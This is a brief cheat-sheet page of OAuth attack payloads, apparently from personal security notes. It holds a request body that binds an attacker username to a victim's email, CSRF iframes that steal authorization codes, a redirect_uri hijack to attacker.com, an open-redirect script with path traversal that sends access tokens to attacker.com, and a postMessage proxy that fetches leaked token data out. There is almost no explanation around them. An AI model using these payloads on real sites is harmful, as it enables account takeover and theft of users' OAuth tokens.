---
title: OAuth Examples
desc: Examples of OAuth.
tags: [CSRF, OAuth, Web]
alts: []
website:
render_with_liquid: false
---

## Change user info

```json
POST /authenticate HTTP/1.1
...

{
    "email":"victim@example.com",
    "username":"attacker",
    "token":"b7Gl7Xoy..."
}
```

<br />

## Using CSRF attack

```html
<!-- Steal code -->
<iframe src="https://vulnerable.com/oauth-linking?code=kZ7bfFa..."></iframe>

<!-- Hijack redirect_uri -->
<iframe src="https://vulnerable.com/auth?client_id=ysdj...&redirect_uri=https://attacker.com&response_type=code&scope=openid%20profile%20email">
</iframe>

<!-- Open redirect (vulnerable to directory traversal) -->
<script>
    if (!document.location.hash) {
        window.location = 'https://vulnerable.com/auth?client_id=7Fdx8a...&redirect_uri=https://vulnerable.com/oauth-callback/../post/next?path=https://attacker.com/exploit/&response_type=token&nonce=398...&scope=openid%20profile%20email'
    } else {
        window.location = '/?'+document.location.hash.substr(1)
    }
</script>

<!-- Proxy page (postMessage) -->
<iframe src="https://vulnerable.com/auth?client_id=iknf...&redirect_uri=https://vulnerable.com/oauth-callback/../post/comment/comment-form&response_type=token&nonce=-118...&scope=openid%20profile%20email"></iframe>
<script>
	window.addEventListener('message', e => {
	  fetch("/" + encodeURIComponent(e.data.data));
	}, false);
</script>
```